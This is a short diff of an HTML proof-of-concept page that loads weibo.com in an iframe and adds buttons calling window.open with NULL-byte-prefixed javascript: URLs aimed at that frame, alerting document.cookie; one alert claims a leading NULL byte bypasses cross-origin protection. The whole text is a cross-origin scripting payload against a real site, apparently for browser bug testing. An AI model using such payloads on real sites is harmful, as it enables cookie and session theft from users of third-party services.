@@ -1,4 +1,6 @@
 <iframe name="test" src="http://weibo.com" style="width: 50%;
 height: 50%;"></iframe> 
-<input type=button value="test" 
-onclick="window.open('\u0000javascript:alert(document.cookie)','test')" >
+<input type=button value="test1" 
+onclick="window.open('\u0000javascript:alert(document.cookie)','test1')" >
+<input type=button value="test2" 
+onclick="window.open('\x00javascript:alert("url with a leading NULL byte can bypass cross origin protection.")','test2')" >
